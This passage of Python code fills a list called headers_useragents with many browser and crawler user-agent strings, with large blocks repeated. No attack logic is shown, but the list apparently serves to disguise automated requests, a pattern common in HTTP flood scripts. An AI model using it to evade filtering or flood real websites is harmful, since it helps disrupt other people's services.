        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like"
        " Gecko) Chrome/4.0.219.6 Safari/532.1"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2;"
        " .NET CLR 2.0.50727; InfoPath.2)"
    )
    headers_useragents.append(
        "Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like"
        " Gecko, Safari) OmniWeb/v563.57"
    )
    headers_useragents.append(
        "Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015;"
        " Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko)"
        " Safari/413"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET"
        " CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706"
        " K-Meleon/1.0"
    )
    headers_useragents.append(
        "Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g"
    )
    headers_useragents.append("Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)")
    headers_useragents.append(
        "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like"
        " Gecko) Shiira/1.2.2 Safari/125"
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300"
        " Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko)"
        " Safari/413"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR"
        " 3.5.30729; InfoPath.2)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)"
    )
    headers_useragents.append("Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)")
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)"
    )
    headers_useragents.append(
        "Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)"
    )
    headers_useragents.append(
        "Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10"
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318"
        " Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0"
    )
    headers_useragents.append(
        "Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10"
        " (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
    )
    headers_useragents.append(
        "Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2;"
        " .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC"
        " 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16"
        " (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16"
    )
    headers_useragents.append(
        "Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718"
        " Firefox/3.5.1"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2;"
        " .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)"
    )
    headers_useragents.append(
        "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)"
    )
    headers_useragents.append("Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)")
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221"
        " Firefox/3.5.7"
    )
    headers_useragents.append(
        "BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107"
        " UP.Link/6.2.3.15.0"
    )
    headers_useragents.append("Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)")
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser"
        " [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)"
    )
    headers_useragents.append(
        "Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3"
        " (.NET CLR 2.0.50727)"
    )
    headers_useragents.append("Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)")
    headers_useragents.append(
        "Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows"
        " NT 5.1;)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720"
        " Minimo/0.007"
    )
    headers_useragents.append(
        "BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR"
        " 2.0.50727; .NET CLR 3.0.04506.30)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)"
    )
    headers_useragents.append("Googlebot/2.1 (http://www.googlebot.com/bot.html)")
    headers_useragents.append("Opera/9.20 (Windows NT 6.0; U; en)")
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205"
        " Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR"
        " 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)"
    )
    headers_useragents.append("Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0")
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML,"
        " like Gecko) Version/4.0 Safari/528.16"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; Yahoo! Slurp/3.0;"
        " http://help.yahoo.com/help/us/ysearch/slurp)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209"
        " Firefox/3.6.13"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR"
        " 1.1.4322; .NET CLR 2.0.50727)"
    )
    headers_useragents.append("Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)")
    headers_useragents.append("Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)")
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401"
        " Firefox/4.0 (.NET CLR 3.5.30729)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo"
        " Firefox/3.6.8"
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809"
        " Fedora/3.6.7-1.fc14 Firefox/3.6.7"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; Yahoo! Slurp;"
        " http://help.yahoo.com/help/us/ysearch/slurp)"
    )
    headers_useragents.append(
        "YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc"
        " dot com ; http://help.yahoo.com/help/us/shop/merchant/)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913"
        " Firefox/3.5.3"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824"
        " Firefox/3.5.3 (.NET CLR 3.5.30729)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824"
        " Firefox/3.5.3 (.NET CLR 3.5.30729)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718"
        " Firefox/3.5.1"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like"
        " Gecko) Chrome/4.0.219.6 Safari/532.1"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2;"
        " .NET CLR 2.0.50727; InfoPath.2)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET"
        " CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR"
        " 2.0.50727; InfoPath.2)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)"
    )
    headers_useragents.append("Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)")
    headers_useragents.append(
        "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51"
    )
    headers_useragents.append(
        "AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; MSIE 9.0; AOL 9.7; AOLBuild 4343.19; Windows NT 6.1;"
        " WOW64; Trident/5.0; FunWebProducts)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.27; Windows NT 5.1;"
        " Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.21; Windows NT 5.1;"
        " Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30;"
        " .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C;"
        " .NET4.0E)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1;"
        " Trident/4.0; GTB7.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR"
        " 3.0.4506.2152; .NET CLR 3.5.30729)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1;"
        " Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR"
        " 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C;"
        " .NET4.0E)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1;"
        " Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR"
        " 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C;"
        " .NET4.0E)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913"
        " Firefox/3.5.3"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824"
        " Firefox/3.5.3 (.NET CLR 2.0.50727)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824"
        " Firefox/3.5.3 (.NET CLR 3.5.30729)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718"
        " Firefox/3.5.1 (.NET CLR 3.0.04506.648)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727;"
        " .NET4.0C; .NET4.0E"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like"
        " Gecko) Chrome/4.0.219.6 Safari/532.1"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2;"
        " .NET CLR 2.0.50727; InfoPath.2)"
    )
    headers_useragents.append(
        "Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like"
        " Gecko, Safari) OmniWeb/v563.57"
    )
    headers_useragents.append(
        "Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015;"
        " Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko)"
        " Safari/413"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET"
        " CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706"
        " K-Meleon/1.0"
    )
    headers_useragents.append(
        "Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g"
    )
    headers_useragents.append("Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)")
    headers_useragents.append(
        "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like"
        " Gecko) Shiira/1.2.2 Safari/125"
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300"
        " Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko)"
        " Safari/413"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR"
        " 3.5.30729; InfoPath.2)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)"
    )
    headers_useragents.append("Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)")
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)"
    )
    headers_useragents.append(
        "Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)"
    )
    headers_useragents.append(
        "Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10"
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318"
        " Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0"
    )
    headers_useragents.append(
        "Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10"
        " (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
    )
    headers_useragents.append(
        "Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2;"
        " .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC"
        " 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16"
        " (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16"
    )
    headers_useragents.append(
        "Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718"
        " Firefox/3.5.1"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2;"
        " .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)"
    )
    headers_useragents.append(
        "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)"
    )
    headers_useragents.append("Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)")
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221"
        " Firefox/3.5.7"
    )
    headers_useragents.append(
        "BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107"
        " UP.Link/6.2.3.15.0"
    )
    headers_useragents.append("Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)")
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser"
        " [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)"
    )
    headers_useragents.append(
        "Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3"
        " (.NET CLR 2.0.50727)"
    )
    headers_useragents.append("Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)")
    headers_useragents.append(
        "Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows"
        " NT 5.1;)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720"
        " Minimo/0.007"
    )
    headers_useragents.append(
        "BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179"
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913"
        " Firefox/3.5.3"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824"
        " Firefox/3.5.3 (.NET CLR 2.0.50727)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824"
        " Firefox/3.5.3 (.NET CLR 3.5.30729)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718"
        " Firefox/3.5.1 (.NET CLR 3.0.04506.648)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727;"
        " .NET4.0C; .NET4.0E"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like"
        " Gecko) Chrome/4.0.219.6 Safari/532.1"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2;"
        " .NET CLR 2.0.50727; InfoPath.2)"
    )
    headers_useragents.append(
        "Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like"
        " Gecko, Safari) OmniWeb/v563.57"
    )
    headers_useragents.append(
        "Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015;"
        " Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko)"
        " Safari/413"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET"
        " CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706"
        " K-Meleon/1.0"
    )
    headers_useragents.append(
        "Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g"
    )
    headers_useragents.append("Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)")
    headers_useragents.append(
        "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like"
        " Gecko) Shiira/1.2.2 Safari/125"
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300"
        " Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko)"
        " Safari/413"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR"
        " 3.5.30729; InfoPath.2)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)"
    )
    headers_useragents.append("Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)")
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)"
    )
    headers_useragents.append(
        "Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)"
    )
    headers_useragents.append(
        "Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10"
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318"
        " Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0"
    )
    headers_useragents.append(
        "Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10"
        " (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
    )
    headers_useragents.append(
        "Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2;"
        " .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC"
        " 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16"
        " (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16"
    )
    headers_useragents.append(
        "Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718"
        " Firefox/3.5.1"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2;"
        " .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)"
    )
    headers_useragents.append(
        "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)"
    )
    headers_useragents.append("Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)")
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221"
        " Firefox/3.5.7"
    )
    headers_useragents.append(
        "BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107"
        " UP.Link/6.2.3.15.0"
    )
    headers_useragents.append("Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)")
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser"
        " [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)"
    )
    headers_useragents.append(
        "Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3"
        " (.NET CLR 2.0.50727)"
    )
    headers_useragents.append("Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)")
    headers_useragents.append(
        "Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows"
        " NT 5.1;)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720"
        " Minimo/0.007"
    )
    headers_useragents.append(
        "BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; 008/0.83; http://www.80legs.com/webcrawler.html)"
        " Gecko/2008032620"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0) AddSugarSpiderBot"
        " www.idealobserver.com"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; AnyApexBot/1.0; +http://www.anyapex.com/bot.html)"
    )
    headers_useragents.append("Mozilla/4.0 (compatible; Arachmo)")
    headers_useragents.append("Mozilla/4.0 (compatible; B-l-i-t-z-B-O-T)")
    headers_useragents.append(
        "Mozilla/5.0 (compatible; Baiduspider/2.0;"
        " +http://www.baidu.com/search/spider.html)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; Baiduspider/2.0;"
